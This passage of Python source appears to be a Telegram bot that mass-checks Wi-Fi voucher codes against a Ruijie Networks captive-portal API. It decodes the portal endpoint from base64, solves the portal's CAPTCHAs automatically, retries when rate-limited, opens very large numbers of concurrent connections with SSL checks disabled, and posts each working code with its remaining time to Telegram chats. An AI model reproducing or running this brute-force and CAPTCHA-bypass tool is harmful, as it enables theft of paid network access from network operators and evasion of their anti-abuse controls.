# ───────────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None,
                        recheck=False, message=None):
    if not recheck:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None

    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout
        ) as ts:
            session_id = await get_session_id(ts, session_url, None)
            if not session_id:
                continue

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(ts, session_id)
                    text  = await Captcha_Text(image)
                    if text and await Varify_Captcha(ts, session_id, text):
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[captcha] {e}")
            if not auth_code:
                continue

            if not recheck:
                cur = scan_tasks.get(chat_id)
                if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
                    return

            try:
                async with ts.post(
                    post_url,
                    json={"accessCode": code, "sessionId": session_id,
                          "apiVersion": 1, "authCode": auth_code},
                    headers={
                        "authority":    "portal-as.ruijienetworks.com",
                        "accept":       "*/*",
                        "content-type": "application/json",
                        "origin":       "https://portal-as.ruijienetworks.com",
                        "user-agent":   ("Mozilla/5.0 (Linux; Android 12; K) "
                                         "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
                    }
                ) as req:
                    response = await req.text()
                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:60]}")
            except Exception as e:
                print(f"[perform_check] {e}")
                return

        if response and 'request limited' in response:
            response = None
            continue
        break

    if not response:
        return

    # ── SUCCESS ──────────────────────────────────────────
    if 'logonUrl' in response:
        if recheck:
            return code

        expire_date, _ = await Code_Expires_Date(session_id)

        success_texts.setdefault(chat_id, []).append(f"🎫 {code}\n   {expire_date}")

        current = user_data.setdefault(chat_id, {}).get('current_display_codes', [])
        current.append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(current)

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})

        if message:
            try:
                if chat_id not in success_messages or len(code_line) > 4000:
                    sent = await bot.send_message(
                        message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}"
                    )
                    success_messages[chat_id]              = sent.message_id
                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=success_messages[chat_id],
                            text=f"Success Codes:\n\n{code_line}"
                        )
                        user_data[chat_id]['current_display_codes'] = current
                    except Exception:
                        sent = await bot.send_message(
                            message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}"
                        )
                        success_messages[chat_id]              = sent.message_id
                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
            except Exception as e:
                print(f"Success message error: {e}")

    # ── LIMITED ──────────────────────────────────────────
    elif 'STA' in response:
        limited_texts.setdefault(chat_id, []).append(code)
        limited_line = "\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(message.chat.id, f"Limited Codes:\n\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception:
                        sent = await bot.send_message(message.chat.id, f"Limited Codes:\n\n{limited_line}")
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"Limited message error: {e}")

# ───────────────────────────────────────────────────────────
# Balance / expiry helpers
# ───────────────────────────────────────────────────────────
def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins    = int(total_minutes)
        hours   = mins // 60
        rem_min = mins % 60
        if hours > 0 and rem_min > 0:
            return f"{hours}h {rem_min}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_min}m"
    except Exception:
        return 'Unknown'

async def Code_Expires_Date(active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}',
    ]
    headers = {
        'authority':        'portal-as.ruijienetworks.com',
        'accept':           'application/json, text/javascript, */*; q=0.01',
        'user-agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    async with aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(total=10)
    ) as fs:
        for url in paths:
            try:
                async with fs.get(url, headers=headers) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result     = respond.get('result', {})
                            raw_mins   = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
                            profile    = result.get('profileName', 'Unknown')
                            totaltime  = Minute_to_Hour(raw_mins)
                            return f"📋 Plan: {profile} | ⏳ Time: {totaltime}", raw_mins
            except Exception as e:
                print(f"[Code_Expires_Date] {e}")
    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

# ───────────────────────────────────────────────────────────
# Polling  (timeout fix — request_timeout > timeout)
# ───────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(
                timeout=45,          # long-poll wait (Telegram holds connection)
                request_timeout=55,  # aiohttp timeout — MUST be > timeout
                interval=0,
            )
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ───────────────────────────────────────────────────────────
# Main
# ───────────────────────────────────────────────────────────
async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(
        limit=20000, limit_per_host=10000,
        ttl_dns_cache=300, ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector, connector_owner=False
    )
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
